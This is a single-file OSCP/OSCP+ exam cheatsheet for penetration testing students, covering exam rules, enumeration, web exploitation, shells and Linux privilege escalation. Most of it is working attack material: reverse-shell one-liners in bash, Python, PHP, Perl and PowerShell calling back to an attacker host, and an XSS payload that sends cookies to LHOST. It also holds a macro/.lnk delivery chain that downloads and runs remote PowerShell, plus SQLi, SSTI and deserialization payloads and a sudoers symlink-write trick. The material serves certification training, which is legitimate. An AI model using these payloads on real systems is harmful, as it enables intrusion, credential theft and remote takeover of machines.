# OSCP / OSCP+ Master Cheatsheet

> Single-file reference. Built for **Ctrl+F**. Headers use plain words you'd actually search for (e.g. `kerberoast`, `SUID`, `chisel`, `LFI`, `unquoted service path`).
> Verified against the **2026 OSCP+ exam format**: 3 standalone boxes (20 pts each = 60) + 1 AD set of 3 machines (40 pts) → **70 to pass**. No buffer-overflow machine anymore. No bonus points since Nov 2024.

---

**How to use:** open this page and `Ctrl+F` the keyword you need (a port like `445`, a technique like `kerberoast`, a tool like `chisel`). Everything is one page on purpose — no clicking around mid-exam. **Keep a local clone/offline copy too** (`git clone` before the exam) so you're never dependent on the network staying up for 24h.

## Contents

- [EXAM RULES & STRATEGY (read first)](#exam-rules--strategy-read-first)
- [SHELLS, UPGRADES & FILE TRANSFER](#shells-upgrades--file-transfer)
- [ENUMERATION](#enumeration)
- [WEB EXPLOITATION](#web-exploitation)
- [PUBLIC EXPLOITS (searchsploit workflow)](#public-exploits-searchsploit-workflow)
- [LINUX PRIVILEGE ESCALATION](#linux-privilege-escalation)
- [WINDOWS PRIVILEGE ESCALATION](#windows-privilege-escalation)
- [ACTIVE DIRECTORY (the 40-point set)](#active-directory-the-40-point-set--prioritize-this)
- [PIVOTING / PORT FORWARDING / TUNNELING](#pivoting--port-forwarding--tunneling)
- [PASSWORD ATTACKS & CRACKING](#password-attacks--cracking)
- [EXAM REPORT](#exam-report-no-points-without-it--dont-fumble-the-deliverable)
- [QUICK-REFERENCE APPENDIX](#quick-reference-appendix)

---

## EXAM RULES & STRATEGY (read first)

### Hard rules (don't get flagged)
- **No AI / LLM chatbots during the exam OR the report phase.** This file is prep — you reference it offline. KAI included. Don't even have a chatbot tab open.
- **Metasploit: ONE target only.** Full MSF (exploit/auxiliary/post + one meterpreter) on a single machine of your choice. **Not** usable for pivoting (that would touch >1 target). `msfvenom`, `searchsploit`, `pattern_create`, `nasm_shell` are NOT counted as "using Metasploit."
- **Responder poisoning/spoofing is BANNED on the exam.** LLMNR/NBT-NS poisoning won't be the path. (Responder is "allowed" only in analyze mode; don't run `-w`/poisoning.)
- **Automatic exploitation tools are BANNED: SQLMap, SQLNinja, db_autopwn, browser_autopwn,** and anything that auto-discovers-and-exploits. Mass scanners (Nessus, OpenVAS, Nexpose) are banned too. Do SQLi and all exploitation **manually**. (Single-target tools like Nikto, dirb, nmap NSE are fine.)
- **PowerShell Core / PSSession counts as a valid interactive shell.**
- Everything happens on the proctored host. Don't discuss the exam anywhere (Discord, forums) — instant policy violation.

### Allowed tools (non-exhaustive, per OffSec)
BloodHound (Legacy + CE), SharpHound, PowerShell Empire, Covenant, PowerView, Rubeus, evil-winrm, Responder (analyze only), CrackMapExec / NetExec, Mimikatz, Impacket, PrintSpoofer. Standard non-MSF exploits are fine.

### How the points pass
You need 70. Realistic winning lines:
- **AD (40) + 3 local.txt (30) = 70** ← most common pass
- AD (40) + 2 local + 1 proof = 70
- AD (20, partial) + all 3 standalones fully = 70
- AD (10) + 3 standalones fully = 70

**Takeaway:** the AD set is the single biggest decider. Land AD first or early. Partial credit exists (foothold = 10, root = 10 on standalones; 10/10/20 on AD).

### Time plan (24h, no pause)
1. **First 20–30 min:** kick off nmap on every target, screenshot as scans run.
2. **Triage:** note quick wins (obvious CVE, anon SMB, default creds).
3. **AD set early** — it's 40 pts and chained; sinking those points first de-risks the day.
4. **Standalones:** grab every foothold (10 pts each) before grinding any single privesc. Partial points stack.
5. **Rotate.** Hard rule: if stuck 1.5–2h with zero progress, switch boxes. Come back fresh.
6. **Stop hacking ~2h before the window ends.** Verify every flag, re-take any missing screenshot, confirm proof.txt contents.

### Proof discipline (you lose points without this)
- Screenshot `local.txt` / `proof.txt` **with** `whoami` / `id` / `ipconfig` / `hostname` in the SAME frame.
- Screenshot the IP of the target in the shell.
- Log everything: `script` or just keep a per-box markdown with every command + output.
- Take MORE screenshots than you think you need. You cannot re-enter after the window closes.

### Per-box note template (copy for each target)
```
## <IP> - <hostname>
Ports:
Foothold: <how> | cred: <user:pass> | local.txt: <hash>
Privesc: <how> | proof.txt: <hash>
Screenshots: [ ] foothold+id  [ ] root+id  [ ] local.txt  [ ] proof.txt
```

---

## SHELLS, UPGRADES & FILE TRANSFER

### Reverse shell one-liners (set `LHOST`/`LPORT` first)
```bash
# Listener
nc -lvnp 443           # or: rlwrap nc -lvnp 443   (arrow keys/history)

# Bash
bash -i >& /dev/tcp/LHOST/443 0>&1
# alt (no /dev/tcp): 
exec 5<>/dev/tcp/LHOST/443; cat <&5 | while read l; do $l 2>&5 >&5; done

# sh / busybox
/bin/sh -i >& /dev/tcp/LHOST/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f

# Python3
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("LHOST",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Powershell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```
- Generate/encode shells fast: **revshells.com** (memorize the format; can't browse during exam unless you cache it). msfvenom equivalents below.
- **Shell fires but never connects back?** Suspect egress filtering on the target — outbound is often restricted to a few ports. Before assuming the RCE failed, retry your listener on **80 / 443 / 53** (almost always allowed out). Same applies to staging downloads: host your payload on `:80`/`:443`.

### Stabilize a Linux TTY (do this immediately)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
# then:
export TERM=xterm
# background w/ Ctrl+Z, then on YOUR box:
stty raw -echo; fg
# (press Enter twice). Now you have arrows, tab, Ctrl+C.
# size it right:
stty size            # on your box -> get rows/cols
stty rows 50 cols 200   # in the shell
```

### msfvenom payloads (NOT counted as Metasploit usage)
```bash
# Windows exe reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f exe -o rev.exe
# Windows staged meterpreter (only if this is your one MSF box)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=L LPORT=443 -f exe -o met.exe
# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=L LPORT=443 -f elf -o rev.elf
# War (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=L LPORT=443 -f war -o shell.war
# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=L LPORT=443 -f aspx -o shell.aspx
# PHP (strip the leading comment / add <?php)
msfvenom -p php/reverse_php LHOST=L LPORT=443 -f raw -o shell.php
# DLL / MSI / shellcode-as-needed: -f dll | msi | raw
```

### File transfer
```bash
# --- Serve from attacker ---
python3 -m http.server 80
impacket-smbserver share . -smb2support            # add -user x -password y if needed
# Windows-friendly SMB (NTLMv1 fallback older boxes):
impacket-smbserver share $(pwd) -smb2support

# --- Linux target pulls ---
wget http://LHOST/file -O /tmp/file
curl http://LHOST/file -o /tmp/file
# no wget/curl:
exec 3<>/dev/tcp/LHOST/80; echo -e "GET /file HTTP/1.0\r\n\r" >&3; cat <&3

# --- Windows target pulls ---
certutil -urlcache -split -f http://LHOST/file.exe file.exe
powershell -c "iwr http://LHOST/file.exe -OutFile file.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/f.exe','f.exe')"
copy \\LHOST\share\file.exe .        # from impacket-smbserver
# exfil a file from Windows back to you:
powershell -c "(New-Object Net.WebClient).UploadFile('http://LHOST/up','f')"   # need a receiver
# or read it over SMB share you host (target writes to \\LHOST\share\)
```

---

## ENUMERATION

### Nmap (run all targets first thing)
```bash
# Fast full TCP port discovery
nmap -p- --min-rate 5000 -T4 -Pn -oN nmap/allports.txt $IP
# Then deep scan only the open ports
ports=$(grep ^[0-9] nmap/allports.txt | cut -d/ -f1 | paste -sd,)
nmap -p$ports -sCV -A -Pn -oN nmap/deep.txt $IP
# UDP top ports (slow - kick off and forget; SNMP/DNS/TFTP/IKE matter)
sudo nmap -sU --top-ports 100 -oN nmap/udp.txt $IP
# Vuln scripts (noisy)
nmap -p$ports --script vuln -oN nmap/vuln.txt $IP
```
- `-sCV` = default scripts + version. `-Pn` skips host discovery (exam boxes block ping). `--min-rate` keeps it moving.
- **Tuning gotchas:** `-A` already implies `-sC -sV` (so `-sCV -A` is redundant — pick one). `--min-rate 5000` is fine for fast discovery but on a flaky exam/lab VPN aggressive rates cause **packet loss → silently missed open ports** — if a box feels "empty," re-run the full sweep at `--min-rate 1500` before assuming. Robust port parse: `ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/allports.txt | paste -sd,)`.
- Automation (enumeration only, exam-safe): **AutoRecon** / nmapAutomator fan out per-service enum for you — fine to run since they enumerate, not auto-exploit. Still read everything yourself.
- Always note the **OS hint, hostname, domain name** (add to `/etc/hosts`).

### /etc/hosts — do this for EVERY web/AD box
```bash
echo "$IP target.htb dc01.target.htb target" | sudo tee -a /etc/hosts
```
vhosts/SNI matter; many web apps 302 to a hostname.

### Port → what to check (Ctrl+F the number)

**21 FTP**
```bash
ftp $IP            # try anonymous:anonymous
nmap --script ftp-anon,ftp-vsftpd-backdoor -p21 $IP
# binary mode for non-text; "ls -la" for hidden
```
**22 SSH** — version → searchsploit; key reuse; weak creds (`hydra`); user enumeration on old OpenSSH.
**23 Telnet** — banner, creds.
**25/587 SMTP**
```bash
nmap --script smtp-commands,smtp-enum-users -p25 $IP
# user enum: VRFY <user> / EXPN / RCPT TO
smtp-user-enum -M VRFY -U users.txt -t $IP
# swaks = send mail / deliver client-side payloads (config.Library-ms, attachments):
swaks --to victim@corp.com --from x@corp.com --server $IP --body "hi" --attach @payload.txt
```
**53 DNS**
```bash
dig axfr target.htb @$IP          # zone transfer (Trick box pattern)
dig any target.htb @$IP
dnsrecon -d target.htb -n $IP -t axfr
```
**79 Finger** — `finger @$IP`; user enum on old boxes.
**88 Kerberos** — it's a DC. → AD section (AS-REP roast, kerberoast).
**110/995 POP3 / 143/993 IMAP** — read mail for creds.
**111 RPCbind / NFS**
```bash
showmount -e $IP                  # list exports
rpcinfo -p $IP
mkdir /mnt/nfs; sudo mount -t nfs $IP:/export /mnt/nfs -o nolock
# no_root_squash export -> privesc later (see Linux PE)
```
**135 / 139 / 445 SMB**
```bash
nxc smb $IP -u '' -p '' --shares                 # null session
nxc smb $IP -u 'guest' -p '' --shares
enum4linux-ng -A $IP
smbclient -L //$IP/ -N                            # list shares anon
smbclient //$IP/share -N                          # connect anon
smbmap -H $IP -u null                             # perms per share
nxc smb $IP -u user -p pass --rid-brute           # user enumeration
nmap --script smb-vuln* -p445 $IP                 # MS17-010 etc.
```
**161 UDP SNMP**
```bash
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects   # run cmds output
onesixtyone -c community.txt $IP                  # brute community string
# look for: process args (creds!), installed software, user accounts
```
**389/636 LDAP**
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=target,DC=htb"
nxc ldap $IP -u user -p pass --asreproast hashes.txt
windapsearch / ldapdomaindump for AD
```
**1433 MSSQL**
```bash
impacket-mssqlclient user:pass@$IP -windows-auth
# in client: enable_xp_cmdshell ; xp_cmdshell 'whoami'
nxc mssql $IP -u sa -p pass -x "whoami"
# linked servers (POO box pattern): EXEC sp_linkedservers ; double-hop via openquery
```
**3306 MySQL** — `mysql -h $IP -u root -p`; UDF privesc; read files (`load_file`, `secure_file_priv`).
**3389 RDP**
```bash
xfreerdp /u:user /p:pass /v:$IP /cert:ignore +clipboard /dynamic-resolution
nxc rdp $IP -u user -p pass
```
> **RDP black screen / `BIO_read returned a system error 110` over the lab VPN?** Not a codec bug — it's an MTU/PMTU blackhole: small auth packets pass, large bitmap frames get silently dropped. Fix once: `sudo ip link set dev tun0 mtu 1350` (1350 works for both HTB and OffSec VPNs). Make it persistent with an OpenVPN `--up` script if it recurs.
**5432 Postgres** — `psql -h $IP -U postgres`; `COPY ... FROM PROGRAM` RCE; read backups (Slonik pattern).
**5985/5986 WinRM**
```bash
nxc winrm $IP -u user -p pass            # "(Pwn3d!)" = you can evil-winrm
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H <NThash>    # pass-the-hash
```
**6379 Redis** — `redis-cli -h $IP`; webshell write via `config set dir`; SSH key write.

### Web enumeration (80/443/8080/8000/8443…)
```bash
whatweb http://$IP ; curl -sI http://$IP            # tech, headers, server
# directory/file brute
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
ffuf -u http://$IP/FUZZ -w wordlist -e .php,.txt,.bak -mc all -fc 404
# vhost / subdomain fuzz (needs hostname in /etc/hosts)
ffuf -u http://$IP -H "Host: FUZZ.target.htb" -w subdomains.txt -fs <baseline-size>
# CMS
nikto -h http://$IP
wpscan --url http://$IP --enumerate u,vp,vt --api-token <opt>
droopescan scan drupal -u http://$IP
joomscan -u http://$IP
# always: view-source, /robots.txt, /sitemap.xml, comments, JS files (endpoints/creds),
# default creds, /server-status, .git/ (git-dumper), backup files (.bak ~ .swp .old)
```
- **Param fuzzing:** `ffuf -u 'http://$IP/page.php?FUZZ=test' -w params.txt -fs <size>` then test each for LFI/SQLi.

---

## WEB EXPLOITATION

### SQL injection
```sql
-- Detect: ' " `  )  --  #  ;   | observe errors / changed behavior
' OR 1=1-- -            -- auth bypass (also: admin'-- - / admin' #)
" OR ""="                -- string ctx
-- Find column count
' ORDER BY 5-- -         -- bump until error
' UNION SELECT NULL,NULL,NULL-- -   -- match count, find printable cols
-- MySQL data
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,password),3 FROM users-- -
-- MySQL file read/write (RCE)
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/sh.php'-- -
-- MSSQL stacked + RCE
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';-- -
```
```bash
# sqlmap is BANNED on the exam (automatic exploitation tool). Do SQLi MANUALLY there.
# For OFF-EXAM practice only, to learn what a vuln looks like:
#   sqlmap -r req.txt --batch --dbs   /   --dump   (never on the real exam)
```
Blind: `' AND 1=1-- -` vs `' AND 1=2-- -`; time: `' AND SLEEP(5)-- -` / `WAITFOR DELAY '0:0:5'`.

### LFI / RFI / path traversal
```bash
# Basic
http://$IP/page.php?file=../../../../etc/passwd
# Double / nested traversal bypass (Trick box pattern)
....//....//....//etc/passwd        # strips "../" once
%2e%2e%2f  / %252e (double url-encode)
# PHP wrappers
php://filter/convert.base64-encode/resource=index.php     # leak source
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==   # data: RCE
expect://id                                                     # if expect ext
# Log poisoning -> RCE (inject PHP into User-Agent, then include the log)
curl http://$IP/ -A "<?php system(\$_GET['c']); ?>"
?file=/var/log/apache2/access.log&c=id
# PHP FILTER CHAIN -> RCE (no log/upload needed; great when only LFI exists - Dante pattern)
#   github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
#   paste the produced php://filter/... blob as the include value, then &c=id
# Other read targets: /proc/self/environ, ssh keys (/home/u/.ssh/id_rsa),
#   /var/www/html/config.php, web.config, /etc/shadow, history files
```
Windows LFI: `..\..\..\Windows\System32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config`.

### File upload bypass → webshell
- Extension tricks: `shell.php.jpg`, `shell.pHp`, `shell.php5/.phtml/.phar`, **trailing dot** `shell.php.` (Environment box pattern), null byte `shell.php%00.jpg` (old PHP), double ext.
- Content-Type spoof: set `Content-Type: image/png` but PHP body.
- Magic bytes: prepend `GIF89a;` then `<?php system($_GET['c']);?>`.
- `.htaccess` upload to map a new ext to PHP: `AddType application/x-httpd-php .xyz`.
- ASP/ASPX/JSP equivalents for Windows/Tomcat; `.war` for Tomcat manager.
- Find the upload path with feroxbuster, then `?c=id`.

### Command injection
```bash
; id        | id        || id        & id        && id
$(id)       `id`        %0a id (newline)
# blind: ping yourself / curl yourself / sleep
; ping -c3 LHOST     ; curl http://LHOST/$(whoami)     ; sleep 5
# filtered space: ${IFS} or {cat,/etc/passwd} or <
cat${IFS}/etc/passwd
```

### SSRF (DevArea / Apache CXF pattern)
- Hit internal services: `http://127.0.0.1:port`, cloud metadata `http://169.254.169.254/...`.
- Bypass filters: `http://127.1`, `http://0`, decimal/hex IP, `http://localhost`, DNS rebinding, `@` tricks `http://allowed@127.0.0.1`.
- Chain to internal admin panels / Redis / unauth APIs.

### XXE
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<!-- OOB / blind: pull external DTD from your http server; PHP filter to base64 large files -->
```

### Common app footholds (searchsploit the exact version)
- **WordPress:** vuln plugins, `wp-config.php` creds, admin → theme editor → PHP RCE, xmlrpc password attack.
- **Tomcat:** `/manager/html` default creds (`tomcat:tomcat`, `admin:admin`) → deploy `.war`.
- **Jenkins:** `/script` Groovy console → RCE (Jeeves pattern). `Runtime.getRuntime().exec(...)`.
- **Git exposed:** `.git/` → `git-dumper` → source/creds.
- **Default creds everywhere** — try before exploiting.

---

### Server-Side Template Injection (SSTI)
```bash
# Detect: inject and look for evaluation -> "49"
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   ${{7*7}}   *{7*7}
# Polyglot to fingerprint engine: ${{<%[%'"}}%\
# Jinja2 (Python/Flask) RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
# Twig (PHP):
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
# Freemarker (Java):
<#assign ex='freemarker.template.utility.Execute'?new()>${ ex('id') }
# Ruby ERB:  <%= `id` %>      Velocity / Smarty also vuln
# tplmap = semi-automated (allowed; manual preferred). Base64-wrap cmds to dodge filters.
```

### Insecure deserialization
```bash
# Java (ysoserial) - blobs: base64 starts "rO0AB", hex "ac ed 00 05"
java -jar ysoserial.jar CommonsCollections5 'curl http://LHOST/x' | base64 -w0
#   gadgets: URLDNS (detect/blind), CommonsCollections1-7, Groovy1, Spring1
# .NET (ysoserial.net) - __VIEWSTATE, BinaryFormatter, Json.NET, Losformatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
#   ViewState w/ leaked machineKey (Hercules pattern):
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --generator=<__VIEWSTATEGENERATOR> --validationkey=<KEY> --validationalg=<ALG> -c "cmd /c whoami"
# PHP object injection (unserialize + magic methods __wakeup/__destruct):
phpggc Symfony/RCE4 system id          # generate gadget chain
# Python pickle (vulnerable loads()):
python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("E",(),{"__reduce__":lambda s:(os.system,("id",))})())) )'
```

### JWT (JSON Web Token) attacks
```bash
# Decode offline: echo <part> | base64 -d   (or jwt.io offline)
# alg:none bypass -> set header {"alg":"none"}, drop signature but KEEP trailing dot
# Weak HMAC secret -> crack then re-sign:
hashcat -m 16500 jwt.txt rockyou.txt
# RS256->HS256 confusion: sign with server's PUBLIC key bytes as the HMAC secret
# jwt_tool does all of it:
python3 jwt_tool.py <JWT> -X a                 # alg:none
python3 jwt_tool.py <JWT> -C -d rockyou.txt    # crack secret
python3 jwt_tool.py <JWT> -T                   # tamper/re-sign
```

### Client-side / auth-flow (lower OSCP priority, but seen — Eloquia pattern)
```bash
# Stored XSS via SVG upload -> steal admin cookie:
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://LHOST/?c='+document.cookie)</script></svg>
# OAuth/SAML CSRF, open-redirect chained to token theft
# IDOR / broken access control: change id params, hit endpoints without auth, mass-assignment (Facts pattern)
# PEN-200 client-side delivery (when a box expects a user to "open" something):
#   - VBA macro in .doc/.docm with a powershell reverse shell (macro_reverse_shell)
#   - config.Library-ms + .lnk over WebDAV: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
#     .lnk runs: powershell IEX(New-Object Net.WebClient).DownloadString('http://LHOST/p.ps1')
#   - deliver via swaks (see SMTP). Listener: nc -lvnp 443
```

---

## PUBLIC EXPLOITS (searchsploit workflow)
```bash
searchsploit apache 2.4
searchsploit -m 50383            # copy exploit to cwd
searchsploit -x 50383            # read it
# ALWAYS read the exploit before running. Fix: RHOST/LHOST, target offsets, python2->3,
# shellcode, hardcoded paths. Compile C exploits ON the target arch if possible:
gcc exploit.c -o exploit         # or cross-compile / use musl-gcc for static
# Windows precompiled privesc binaries: keep a local stash (PrintSpoofer, GodPotato, etc.)
```
### Compiling exploits
```bash
# Windows privesc exploit (C) compiled on Kali with mingw:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe                 # 64-bit
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32          # 32-bit + winsock
# Static Linux binary (target missing shared libs):
gcc -static exploit.c -o exploit          # or: musl-gcc -static exploit.c -o exploit
gcc -m32 exploit.c -o exploit             # 32-bit on 64-bit Kali (needs gcc-multilib)
# Old python2 PoC on modern Kali: run with python2.7, or port print()/sockets to py3
# ALWAYS read & adjust offsets/RHOST/LHOST/shellcode before running.
```

Sources to cache offline before exam: exploit-db, GitHub PoCs, HackTricks, GTFOBins, LOLBAS, PayloadsAllTheThings. (No AI during exam — these are your lifelines.)

---

## LINUX PRIVILEGE ESCALATION

### Enumerate
```bash
# Automated
./linpeas.sh | tee linpeas.txt        # serve via http, curl|bash
# pspy to watch cron/processes WITHOUT root (catch cron jobs - Slonik pattern)
./pspy64
# Manual quick hits
id; sudo -l; uname -a; cat /etc/os-release
ls -la /home/*; cat /home/*/.bash_history; cat /home/*/.ssh/id_rsa
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
getcap -r / 2>/dev/null                        # capabilities
cat /etc/crontab; ls -la /etc/cron.*
ss -tlnp; netstat -tlnp                        # internal services -> pivot/forward
env; cat /etc/passwd; ls -la /opt /srv /var/www
mount; cat /etc/fstab                          # nfs no_root_squash
```

### sudo -l  (top priority — check first)
```bash
# Anything listed -> GTFOBins it. Common wins:
sudo vim -c ':!/bin/sh'                  sudo less /etc/profile  -> !/bin/sh
sudo find . -exec /bin/sh \; -quit       sudo awk 'BEGIN{system("/bin/sh")}'
sudo python3 -c 'import os;os.system("/bin/sh")'      sudo perl -e 'exec "/bin/sh";'
sudo nmap --interactive -> !sh (old)     sudo env /bin/sh
# sudo with NOPASSWD on a custom script -> read it, hijack what it calls
# LD_PRELOAD / LD_LIBRARY_PATH if env_keep+= set:
sudo LD_PRELOAD=/tmp/x.so someprog       # compile x.so with _init() spawning shell
# (NOPASSWD) ALL or specific binary -> https://gtfobins.github.io
```

### SUID / SGID
```bash
# Each non-standard SUID -> GTFOBins (search the binary name)
# Examples:
./find . -exec /bin/sh -p \; -quit       # SUID find
cp /bin/bash /tmp/b; ... ; bash -p        # SUID bash copies / SUID cp /etc/passwd
# Custom SUID binary calling a command without abs path -> PATH hijack:
export PATH=/tmp:$PATH ; echo '/bin/bash -p' > /tmp/service; chmod +x /tmp/service
# strings the binary, ltrace it, find system()/exec calls
```
**SUID bash directly** (Trick / Slonik / fail2ban patterns): `bash -p` gives euid root shell.

### Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_dac_read_search -> read any file (shadow); cap_setuid on others -> GTFOBins
```

### Cron jobs (use pspy to catch them)
```bash
# Writable script run by root cron -> add reverse shell / chmod +s /bin/bash
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/writable_cron_script
# Wildcard injection (tar/rsync in cron with *):
echo 'mkfifo /tmp/p;nc LHOST 443 0</tmp/p|/bin/sh>/tmp/p 2>&1' > shell.sh
touch ./--checkpoint=1; touch ./'--checkpoint-action=exec=sh shell.sh'
# PATH-relative binary in root cron/script -> PATH hijack
```

### PATH hijacking (DevArea pattern)
Binary or script (SUID/cron/sudo) calls e.g. `service`/`ps`/`cat` without full path → put a malicious one earlier in `$PATH`. Watch shebang & `set -e`/`pipefail` quirks in target scripts.

### NFS no_root_squash (Slonik-adjacent)
```bash
# On YOUR box (as root), mount the export, drop a SUID root binary:
mkdir /mnt/x; mount -o rw,vers=3 $IP:/export /mnt/x
cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash
# On target: /export/rootbash -p   -> root
```

### Writable /etc/passwd or /etc/shadow
```bash
openssl passwd -1 -salt x pass            # make hash
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su root2
# Or blank root's x field if you can edit and no shadow
```

### Arbitrary file write as root → symlink-follow primitives
A root-run helper (a `sudo NOPASSWD` custom binary, a root cron, a SUID tool) that **writes/copies to an attacker-influenced destination path without `O_NOFOLLOW`** = arbitrary write as root. Plant a symlink at the destination, point it where you want, trigger the write.
```bash
# Pattern: tool copies <src> -> <dst> as root and follows symlinks on <dst>.
# 1) make the payload (mode matters for sudoers: must be 0440)
echo 'youruser ALL=(ALL) NOPASSWD:ALL' > payload; chmod 440 payload
# 2) plant a symlink where the tool will WRITE, pointing at the target file
ln -s /etc/sudoers.d/pwn dst_link
# 3) run the root tool so it copies payload -> dst_link (= /etc/sudoers.d/pwn)
#    then:
sudo -i        # you're root
```
**Best write-anywhere-as-root targets** (in order of reliability):
- `/etc/sudoers.d/pwn` → `youruser ALL=(ALL) NOPASSWD:ALL` (file MUST be mode 0440, no syntax errors). Cleanest.
- `/etc/passwd` → append a `uid=0` user with a known hash (see above).
- root cron (`/etc/cron.d/x`) → reverse shell on a schedule.
- `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it (often disabled — don't burn time here first).

**Archive-extraction variant (zip-slip / symlink-in-archive).** A root process that *extracts* an attacker-supplied `.zip`/`.tar` and preserves or follows **symlink members** gives the same primitive. Note: many libraries sanitize `../` traversal (collapsing dot segments) yet still mishandle symlink entries — so when plain `../../` is filtered, try a **symlink member** instead:
```bash
# source-side symlink in the archive -> arbitrary READ as root (if extraction reads the link)
ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
# destination-side symlink at the extract path -> arbitrary WRITE as root (sudoers.d trick above)
```
> Reproduce the extractor's exact behavior locally first (which lib/version, does it create real symlinks or write them as regular files?). The write-side `/etc/sudoers.d/` path lands far more often than the SSH path.

### Service / systemd / D-Bus / docker / lxd
```bash
# docker group (Kobold pattern): 
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd group:
lxc init alpine c -c security.privileged=true; lxc config device add c d disk source=/ path=/mnt; lxc start c; lxc exec c sh
# writable .service / writable ExecStart binary run by root -> replace + restart
# newgrp docker (Kobold) if your secondary group includes docker
```

### Kernel exploits (last resort — can crash the box)
```bash
uname -a ; searchsploit linux kernel <version>
# Classics: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit/polkit (CVE-2021-4034), 
#   Sudo Baron Samedit (CVE-2021-3156), GameOverlay (CVE-2023-2640/32629)
# PwnKit is a reliable go-to on many older boxes:
./PwnKit        # self-contained
```

### Other
- Readable backups / config files with creds (Slonik: pg backup analysis).
- `.bash_history`, `.mysql_history`, `.viminfo`, `/var/mail`, `/var/backups`.
- Password reuse across users/services — always try found creds with `su`/SSH.
- Internal-only service on 127.0.0.1 → forward it out and attack (see Pivoting).

### Restricted shell escape (rbash / lshell / limited menus — Dante lshell pattern)
```bash
# Break out to a real shell:
vi              # then  :set shell=/bin/bash   ->  :shell    (or  :!/bin/bash)
python3 -c 'import pty;pty.spawn("/bin/bash")'
awk 'BEGIN{system("/bin/bash")}'
find / -name nonexistent -exec /bin/bash \; -quit
# Get in already-unrestricted:
ssh user@host -t "/bin/bash --noprofile --norc"
ssh user@host -t "() { :; }; /bin/bash"
# rbash: call binaries by absolute path (/bin/ls), or set PATH/SHELL if export allowed.
# lshell: try command injection inside an allowed builtin, or  echo os.system('/bin/bash')
```

### Misc Linux PE notes
```bash
sudo -V | head -1        # sudo version -> Baron Samedit CVE-2021-3156 if < 1.9.5p2
screen -list ; tmux ls   # SUID screen/tmux -> hijack/attach root sessions (rare, old screen 4.5.0)
# writable library path used by a root service -> drop malicious .so
